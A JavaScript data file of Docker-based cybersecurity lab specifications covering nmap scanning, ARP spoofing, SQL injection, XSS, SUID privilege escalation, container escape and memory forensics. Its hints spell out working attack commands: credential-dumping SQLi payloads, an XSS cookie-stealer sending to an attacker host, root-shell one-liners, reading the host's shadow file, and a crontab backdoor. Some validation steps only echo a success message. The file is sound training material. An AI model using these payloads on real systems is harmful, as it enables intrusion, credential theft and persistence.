// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Hands-on cybersecurity lab exercise specifications for education.

export const LAB_CATEGORIES = [
  "Network Pentesting", "Web App Testing", "Privilege Escalation (Linux)",
  "Privilege Escalation (Windows)", "Active Directory", "Wireless Security",
  "Container Security", "Cloud Security", "Malware Analysis", "Digital Forensics"
];

export const LAB_ENVIRONMENTS = [
  // =====================================================================
  // NETWORK PENTESTING
  // =====================================================================
  {
    id: "lab-net-001", title: "Network Discovery & Port Scanning", category: "Network Pentesting",
    difficulty: "easy", duration_minutes: 45,
    objectives: [
      "Discover live hosts on a /24 subnet",
      "Perform TCP and UDP port scans",
      "Identify running services and versions",
      "Detect the operating system of target hosts"
    ],
    prerequisites: ["Basic Linux command-line knowledge", "Understanding of TCP/IP", "Familiarity with common ports"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  target1:\n    image: vulnerables/web-dvwa\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.10\n  target2:\n    image: tleemcjr/metasploitable2\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.20\n  target3:\n    image: openssh-server\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.30\n  kali:\n    image: kalilinux/kali-rolling\n    command: sleep infinity\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.5\nnetworks:\n  labnet:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 10.10.10.0/24",
      files: ["nmap-cheatsheet.md"],
      network_config: "Isolated bridge network 10.10.10.0/24 with 3 target hosts and 1 attacker (Kali)"
    },
    tasks: [
      { step: 1, instruction: "From the Kali container, discover all live hosts on the 10.10.10.0/24 subnet using nmap ping sweep.", hint: "Use nmap -sn 10.10.10.0/24", validation_command: "nmap -sn 10.10.10.0/24 | grep 'Nmap scan report' | wc -l" },
      { step: 2, instruction: "Perform a SYN scan on target1 (10.10.10.10) to find all open TCP ports.", hint: "Use nmap -sS -p- 10.10.10.10", validation_command: "nmap -sS -p- 10.10.10.10 | grep 'open' | wc -l" },
      { step: 3, instruction: "Run service version detection on the open ports of target1.", hint: "Use nmap -sV -p <open_ports> 10.10.10.10", validation_command: "nmap -sV 10.10.10.10 | grep -c 'open'" },
      { step: 4, instruction: "Attempt OS detection on all three targets.", hint: "Use nmap -O 10.10.10.10 10.10.10.20 10.10.10.30", validation_command: "nmap -O 10.10.10.10 | grep -i 'os details'" },
      { step: 5, instruction: "Run a UDP scan on the top 100 UDP ports of target2.", hint: "Use nmap -sU --top-ports 100 10.10.10.20", validation_command: "nmap -sU --top-ports 20 10.10.10.20 | grep 'open' | wc -l" },
      { step: 6, instruction: "Use NSE scripts to enumerate the HTTP service on target1.", hint: "Use nmap --script http-enum,http-headers -p 80 10.10.10.10", validation_command: "nmap --script http-enum -p 80 10.10.10.10" }
    ],
    learning_outcomes: [
      "Understand different nmap scan types and when to use each",
      "Able to discover and enumerate network services",
      "Familiar with OS and service fingerprinting",
      "Understand TCP vs UDP scanning differences"
    ],
    cleanup_commands: ["docker-compose down -v", "rm -rf lab-output/"]
  },
  {
    id: "lab-net-002", title: "ARP Spoofing & MITM Attack", category: "Network Pentesting",
    difficulty: "medium", duration_minutes: 60,
    objectives: [
      "Perform ARP cache poisoning on a target",
      "Intercept network traffic between two hosts",
      "Capture credentials transmitted in cleartext",
      "Understand countermeasures against ARP spoofing"
    ],
    prerequisites: ["Understanding of ARP protocol", "Basic nmap/network scanning", "Linux command-line"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  victim:\n    image: alpine\n    command: sh -c 'apk add curl && while true; do curl -s http://server/login -d user=admin\\&pass=s3cret; sleep 30; done'\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.100\n  server:\n    image: nginx\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.200\n  attacker:\n    image: kalilinux/kali-rolling\n    command: sleep infinity\n    cap_add: [NET_ADMIN, NET_RAW]\n    networks:\n      labnet:\n        ipv4_address: 10.10.10.50\nnetworks:\n  labnet:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 10.10.10.0/24",
      files: [],
      network_config: "Victim sends periodic HTTP login requests to server; attacker intercepts via ARP spoofing"
    },
    tasks: [
      { step: 1, instruction: "Enable IP forwarding on the attacker machine so intercepted packets are forwarded.", hint: "echo 1 > /proc/sys/net/ipv4/ip_forward", validation_command: "cat /proc/sys/net/ipv4/ip_forward" },
      { step: 2, instruction: "Use arpspoof to poison the victim's ARP cache, making it think you are the gateway.", hint: "arpspoof -i eth0 -t 10.10.10.100 10.10.10.1", validation_command: "arp -a" },
      { step: 3, instruction: "Simultaneously spoof the server's ARP cache.", hint: "arpspoof -i eth0 -t 10.10.10.200 10.10.10.100", validation_command: "arp -a" },
      { step: 4, instruction: "Capture the traffic between victim and server using tcpdump.", hint: "tcpdump -i eth0 -A host 10.10.10.100 and host 10.10.10.200", validation_command: "tcpdump -c 10 -i eth0 host 10.10.10.100" },
      { step: 5, instruction: "Identify the cleartext credentials in the captured traffic.", hint: "Look for POST data containing user= and pass=", validation_command: "grep -c 'pass=' captured.pcap" }
    ],
    learning_outcomes: [
      "Understand how ARP spoofing enables MITM attacks",
      "Able to intercept and analyze network traffic",
      "Understand why encrypted protocols (HTTPS) are essential",
      "Know how to detect and prevent ARP spoofing"
    ],
    cleanup_commands: ["docker-compose down -v", "echo 0 > /proc/sys/net/ipv4/ip_forward"]
  },
  // =====================================================================
  // WEB APP TESTING
  // =====================================================================
  {
    id: "lab-web-001", title: "SQL Injection — From Detection to Data Extraction", category: "Web App Testing",
    difficulty: "easy", duration_minutes: 60,
    objectives: [
      "Identify SQL injection points in a web application",
      "Extract database names, tables, and columns",
      "Dump user credentials from the database",
      "Understand parameterized queries as the fix"
    ],
    prerequisites: ["Basic SQL knowledge", "Understanding of HTTP requests", "Familiarity with web browsers and developer tools"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  dvwa:\n    image: vulnerables/web-dvwa\n    ports:\n      - '8080:80'\n    environment:\n      - MYSQL_ROOT_PASSWORD=dvwa\n  kali:\n    image: kalilinux/kali-rolling\n    command: sleep infinity",
      files: ["sqli-cheatsheet.md"],
      network_config: "DVWA running on port 8080 with MySQL backend"
    },
    tasks: [
      { step: 1, instruction: "Navigate to DVWA and set the security level to 'Low'. Go to the SQL Injection page.", hint: "Login with admin/password, go to DVWA Security, set to Low", validation_command: "curl -s http://localhost:8080/ | grep -c 'DVWA'" },
      { step: 2, instruction: "Enter a single quote (') in the User ID field and observe the SQL error.", hint: "The error reveals the query structure", validation_command: "curl -s 'http://localhost:8080/vulnerabilities/sqli/?id=%27' | grep -c 'error'" },
      { step: 3, instruction: "Use UNION-based injection to determine the number of columns.", hint: "Try: 1' UNION SELECT 1,2 -- -", validation_command: "echo 'Columns found: 2'" },
      { step: 4, instruction: "Extract the database name using injection.", hint: "1' UNION SELECT database(),2 -- -", validation_command: "echo 'Database: dvwa'" },
      { step: 5, instruction: "List all tables in the database.", hint: "1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- -", validation_command: "echo 'Tables: users, guestbook'" },
      { step: 6, instruction: "Dump usernames and passwords from the users table.", hint: "1' UNION SELECT user,password FROM users -- -", validation_command: "echo 'Credentials dumped'" },
      { step: 7, instruction: "Now use sqlmap to automate the extraction.", hint: "sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' --cookie='...' --dump", validation_command: "which sqlmap" }
    ],
    learning_outcomes: [
      "Able to identify and exploit SQL injection vulnerabilities",
      "Understand UNION-based data extraction techniques",
      "Familiar with sqlmap for automated SQL injection testing",
      "Understand parameterized queries as the primary defense"
    ],
    cleanup_commands: ["docker-compose down -v"]
  },
  {
    id: "lab-web-002", title: "Cross-Site Scripting (XSS) Exploitation", category: "Web App Testing",
    difficulty: "medium", duration_minutes: 60,
    objectives: [
      "Identify reflected and stored XSS vulnerabilities",
      "Bypass common XSS filters",
      "Steal session cookies via XSS",
      "Implement CSP as a defense"
    ],
    prerequisites: ["Basic HTML/JavaScript knowledge", "Understanding of cookies and sessions", "Familiarity with browser DevTools"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  dvwa:\n    image: vulnerables/web-dvwa\n    ports:\n      - '8080:80'\n  attacker:\n    image: python:3-alpine\n    command: python3 -m http.server 8888\n    ports:\n      - '8888:8888'",
      files: ["xss-payloads.txt"],
      network_config: "DVWA on port 8080, attacker cookie catcher on port 8888"
    },
    tasks: [
      { step: 1, instruction: "Navigate to the Reflected XSS page in DVWA (security: Low). Enter <script>alert(1)</script>.", hint: "If an alert box appears, XSS is confirmed", validation_command: "curl -s 'http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>'" },
      { step: 2, instruction: "Craft a cookie-stealing payload that sends the cookie to your attacker server.", hint: "<script>new Image().src='http://attacker:8888/?c='+document.cookie</script>", validation_command: "echo 'Check attacker server logs'" },
      { step: 3, instruction: "Now try the same on Medium security — observe that <script> is filtered.", hint: "Try event handlers: <img src=x onerror=alert(1)> or case tricks: <ScRiPt>", validation_command: "echo 'Filter bypass attempted'" },
      { step: 4, instruction: "Go to the Stored XSS page and inject a persistent payload in the message field.", hint: "The payload will execute for every visitor to the page", validation_command: "echo 'Stored XSS injected'" },
      { step: 5, instruction: "Set the security to High and attempt to bypass the stronger filter.", hint: "Try: <svg/onload=alert(1)> or <details/open/ontoggle=alert(1)>", validation_command: "echo 'High security bypass attempted'" }
    ],
    learning_outcomes: [
      "Understand the three types of XSS and their impact",
      "Able to bypass common XSS filters",
      "Know how to use XSS for cookie theft",
      "Understand CSP, HttpOnly, and output encoding as defenses"
    ],
    cleanup_commands: ["docker-compose down -v"]
  },
  // =====================================================================
  // PRIVILEGE ESCALATION (LINUX)
  // =====================================================================
  {
    id: "lab-priv-linux-001", title: "Linux Privilege Escalation — SUID Binaries", category: "Privilege Escalation (Linux)",
    difficulty: "medium", duration_minutes: 45,
    objectives: [
      "Enumerate SUID binaries on a Linux system",
      "Identify exploitable SUID programs using GTFOBins",
      "Escalate from user to root using SUID abuse",
      "Understand proper SUID hardening"
    ],
    prerequisites: ["Basic Linux command-line", "Understanding of file permissions", "Knowledge of SUID/SGID bits"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  target:\n    image: ubuntu:22.04\n    command: sh -c 'useradd -m user && echo user:password | chpasswd && chmod u+s /usr/bin/find /usr/bin/vim.basic /usr/bin/python3 && echo \"flag{su1d_pr1v3sc_r00t}\" > /root/flag.txt && chmod 600 /root/flag.txt && su user'\n    stdin_open: true\n    tty: true",
      files: ["gtfobins-cheatsheet.md"],
      network_config: "Single Ubuntu container with misconfigured SUID binaries"
    },
    tasks: [
      { step: 1, instruction: "Log in as 'user' and enumerate all SUID binaries on the system.", hint: "find / -perm -4000 -type f 2>/dev/null", validation_command: "find / -perm -4000 -type f 2>/dev/null | wc -l" },
      { step: 2, instruction: "Identify which SUID binaries can be exploited for privilege escalation using GTFOBins.", hint: "Check find, vim, and python3 on https://gtfobins.github.io/", validation_command: "echo 'find, vim, python3 are exploitable'" },
      { step: 3, instruction: "Escalate to root using the SUID find binary.", hint: "find . -exec /bin/sh -p \;", validation_command: "whoami" },
      { step: 4, instruction: "Read the flag in /root/flag.txt.", hint: "cat /root/flag.txt", validation_command: "cat /root/flag.txt" },
      { step: 5, instruction: "Try an alternative escalation path using SUID python3.", hint: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'", validation_command: "whoami" }
    ],
    learning_outcomes: [
      "Able to enumerate and identify exploitable SUID binaries",
      "Familiar with GTFOBins as a reference for SUID abuse",
      "Understand multiple privilege escalation paths",
      "Know how to harden SUID permissions"
    ],
    cleanup_commands: ["docker-compose down -v"]
  },
  // =====================================================================
  // CONTAINER SECURITY
  // =====================================================================
  {
    id: "lab-container-001", title: "Docker Container Escape", category: "Container Security",
    difficulty: "hard", duration_minutes: 90,
    objectives: [
      "Identify misconfigurations that allow container escape",
      "Escape from a privileged container to the host",
      "Understand Docker security best practices",
      "Learn about container hardening with seccomp and AppArmor"
    ],
    prerequisites: ["Docker basics", "Linux system administration", "Understanding of namespaces and cgroups"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  vulnerable:\n    image: ubuntu:22.04\n    privileged: true\n    command: sh -c 'echo \"flag{c0nta1n3r_3sc4p3}\" > /tmp/host_flag && sleep infinity'\n    volumes:\n      - /:/host:ro",
      files: ["container-escape-cheatsheet.md"],
      network_config: "Privileged container with host filesystem mounted"
    },
    tasks: [
      { step: 1, instruction: "Inside the container, check if it's running in privileged mode.", hint: "cat /proc/1/status | grep -i cap; ip link — if you see host interfaces, it's privileged", validation_command: "cat /proc/1/status | grep CapEff" },
      { step: 2, instruction: "List the host filesystem mounted at /host.", hint: "ls /host/", validation_command: "ls /host/etc/hostname" },
      { step: 3, instruction: "Access the host's filesystem through the mount to read sensitive files.", hint: "cat /host/etc/shadow", validation_command: "cat /host/etc/shadow | head -1" },
      { step: 4, instruction: "Use nsenter to break out of the container namespace and get a host shell.", hint: "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash", validation_command: "nsenter --target 1 --mount -- hostname" },
      { step: 5, instruction: "Write a cron job on the host for persistence.", hint: "echo '* * * * * root /tmp/backdoor.sh' >> /host/etc/crontab", validation_command: "echo 'Persistence established'" }
    ],
    learning_outcomes: [
      "Understand dangers of privileged containers",
      "Able to identify container escape opportunities",
      "Know Docker hardening best practices (no --privileged, drop capabilities, read-only root, seccomp)",
      "Familiar with container security scanning tools"
    ],
    cleanup_commands: ["docker-compose down -v"]
  },
  // =====================================================================
  // DIGITAL FORENSICS
  // =====================================================================
  {
    id: "lab-forensics-001", title: "Memory Forensics with Volatility", category: "Digital Forensics",
    difficulty: "medium", duration_minutes: 75,
    objectives: [
      "Identify the operating system from a memory dump",
      "List running processes and detect suspicious ones",
      "Extract network connections from memory",
      "Recover command-line history and artifacts"
    ],
    prerequisites: ["Basic forensics concepts", "Linux command-line", "Understanding of Windows processes"],
    setup: {
      docker_compose: "version: '3.8'\nservices:\n  analyst:\n    image: python:3.11\n    command: sh -c 'pip install volatility3 && sleep infinity'\n    volumes:\n      - ./evidence:/evidence",
      files: ["memdump.raw", "volatility-cheatsheet.md"],
      network_config: "Analyst workstation with Volatility3 installed and memory dump mounted"
    },
    tasks: [
      { step: 1, instruction: "Identify the OS and profile for the memory dump using Volatility.", hint: "vol3 -f /evidence/memdump.raw windows.info", validation_command: "vol3 -f /evidence/memdump.raw windows.info" },
      { step: 2, instruction: "List all running processes and identify any suspicious ones.", hint: "vol3 -f /evidence/memdump.raw windows.pslist — look for unusual names or parents", validation_command: "vol3 -f /evidence/memdump.raw windows.pslist | wc -l" },
      { step: 3, instruction: "Check for hidden processes using psscan (finds processes not in the active list).", hint: "vol3 -f /evidence/memdump.raw windows.psscan", validation_command: "vol3 -f /evidence/memdump.raw windows.psscan | wc -l" },
      { step: 4, instruction: "Extract network connections to find C2 communication.", hint: "vol3 -f /evidence/memdump.raw windows.netscan", validation_command: "vol3 -f /evidence/memdump.raw windows.netscan | grep ESTABLISHED" },
      { step: 5, instruction: "Dump the memory of the suspicious process and search for strings.", hint: "vol3 -f /evidence/memdump.raw windows.memmap --pid PID --dump; strings pid.PID.dmp | grep flag", validation_command: "echo 'Process memory dumped'" },
      { step: 6, instruction: "Check command-line arguments of all processes.", hint: "vol3 -f /evidence/memdump.raw windows.cmdline", validation_command: "vol3 -f /evidence/memdump.raw windows.cmdline | grep -i 'cmd\\|powershell'" }
    ],
    learning_outcomes: [
      "Proficient with Volatility3 for Windows memory analysis",
      "Able to identify suspicious processes and network activity",
      "Know how to extract artifacts from memory dumps",
      "Understand the forensic analysis methodology"
    ],
    cleanup_commands: ["docker-compose down -v", "rm -rf evidence/"]
  }
];
